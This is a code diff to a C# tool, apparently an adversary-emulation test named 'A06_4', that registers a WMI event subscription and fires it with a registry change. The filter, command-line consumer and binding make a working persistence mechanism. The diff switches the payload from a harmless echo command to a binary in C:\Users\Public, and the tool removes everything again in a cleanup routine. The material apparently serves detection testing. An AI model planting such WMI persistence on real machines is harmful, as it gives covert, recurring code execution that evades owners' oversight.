@@ -10,7 +10,9 @@ namespace A06_4_wmi_persistence
         private const string EventFilterName = "A06_4_RegistryFilter";
         private const string ConsumerName = "A06_4_RegistryConsumer";
         private const string WqlQuery = @"SELECT * FROM RegistryValueChangeEvent WHERE Hive='HKEY_LOCAL_MACHINE' AND KeyPath='SOFTWARE\\A06_4_Test' AND ValueName='Trigger'";
-        private const string CommandLinePayload = @"cmd.exe /c echo A06_4_TRIGGERED > C:\Users\Public\A06_4_marker.txt";
+
+        // Updated: Point directly to the custom compiled binary payload location
+        private const string CommandLinePayload = @"C:\Users\Public\A06_4_marker.exe";
 
         static void Main(string[] args)
         {
@@ -53,7 +55,7 @@ namespace A06_4_wmi_persistence
         {
             Console.WriteLine("[*] Initializing WMI Registration Flow...");
 
-            // 1. Natively create the registry test path and initialize the watched property string
+            // Natively create the registry test path and initialize the watched property string
             try
             {
 #pragma warning disable CA1416
@@ -77,7 +79,7 @@ namespace A06_4_wmi_persistence
             }
 
 #pragma warning disable CA1416
-            // 2. Create the Event Filter
+            // 1. Create the Event Filter
             ManagementClass filterClass = new ManagementClass(scope, new ManagementPath("__EventFilter"), null);
             ManagementObject filterObject = filterClass.CreateInstance();
             filterObject["Name"] = EventFilterName;
@@ -87,7 +89,7 @@ namespace A06_4_wmi_persistence
             filterObject.Put();
             Console.WriteLine("[+] Created __EventFilter successfully.");
 
-            // 3. Create the CommandLineEventConsumer
+            // 2. Create the CommandLineEventConsumer
             ManagementClass consumerClass = new ManagementClass(scope, new ManagementPath("CommandLineEventConsumer"), null);
             ManagementObject consumerObject = consumerClass.CreateInstance();
             consumerObject["Name"] = ConsumerName;
@@ -95,7 +97,7 @@ namespace A06_4_wmi_persistence
             consumerObject.Put();
             Console.WriteLine("[+] Created CommandLineEventConsumer successfully.");
 
-            // 4. Create the FilterToConsumerBinding
+            // 3. Create the FilterToConsumerBinding
             ManagementClass bindingClass = new ManagementClass(scope, new ManagementPath("__FilterToConsumerBinding"), null);
             ManagementObject bindingObject = bindingClass.CreateInstance();
             bindingObject["Filter"] = filterObject.Path.RelativePath;
@@ -111,7 +113,7 @@ namespace A06_4_wmi_persistence
             try
             {
 #pragma warning disable CA1416
-                // The '!' at the end tells the compiler you guarantee this will not be null
+                // Using the '!' operator to pass the nullable checks explicitly 
                 using (RegistryKey key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\A06_4_Test", true)!)
                 {
                     if (key != null)
@@ -119,26 +121,25 @@ namespace A06_4_wmi_persistence
                         // Modify the value to fire the RegistryValueChangeEvent WMI trigger
                         key.SetValue("Trigger", "A06_4_FIRE", RegistryValueKind.String);
 
-                        // Flush forces physical serialization to disk immediately
+                        // Flush forces physical serialization to disk immediately, preventing WMI race conditions
                         key.Flush();
                         Console.WriteLine("[+] Fired trigger: HKLM\\SOFTWARE\\A06_4_Test -> Trigger = 'A06_4_FIRE'");
                     }
                 }
 #pragma warning restore CA1416
-                Console.WriteLine("[*] Check C:\\Users\\Public\\A06_4_marker.txt to verify WmiPrvSE execution success.");
+                Console.WriteLine("[*] Check C:\\Users\\Public\\A06_4_marker_OK.txt to verify custom binary telemetry capture.");
             }
             catch (Exception ex)
             {
                 Console.WriteLine($"[-] Failed to execute automated registry trigger: {ex.Message}");
             }
         }
-
 #pragma warning disable CA1416
         private static void ExecuteCleanup(ManagementScope scope)
         {
             Console.WriteLine("[*] Initializing WMI Cleanup Flow...");
 
-            // Fix 1: Use ObjectQuery searcher pattern to find and remove bindings robustly
+            // Use ObjectQuery searcher pattern to find and remove bindings robustly
             try
             {
                 string bindingQuery = $"SELECT * FROM __FilterToConsumerBinding WHERE Filter LIKE '%{EventFilterName}%' AND Consumer LIKE '%{ConsumerName}%'";
@@ -161,7 +162,8 @@ namespace A06_4_wmi_persistence
             // Relational object paths for remaining direct target deletions
             string filterPath = $"__EventFilter.Name='{EventFilterName}'";
             string consumerPath = $"CommandLineEventConsumer.Name='{ConsumerName}'";
-
+#pragma warning restore CA1416
+#pragma warning disable CA1416
             // 2. Delete Event Filter
             try
             {
@@ -184,7 +186,7 @@ namespace A06_4_wmi_persistence
             }
             catch (ManagementException) { Console.WriteLine("[-] Event Consumer not found or already deleted."); }
 
-            // Fix 1b: Resolved missing closing brace syntax error on registry clean block
+            // Clean up the test registry key during uninstallation
             try
             {
                 Registry.LocalMachine.DeleteSubKeyTree(@"SOFTWARE\A06_4_Test", false);
@@ -194,9 +196,9 @@ namespace A06_4_wmi_persistence
             {
                 /* Fail silently if key wasn't there */
             }
+#pragma warning restore CA1416
 
             Console.WriteLine("[+] Cleanup completed.");
         }
-#pragma warning restore CA1416
     }
 }
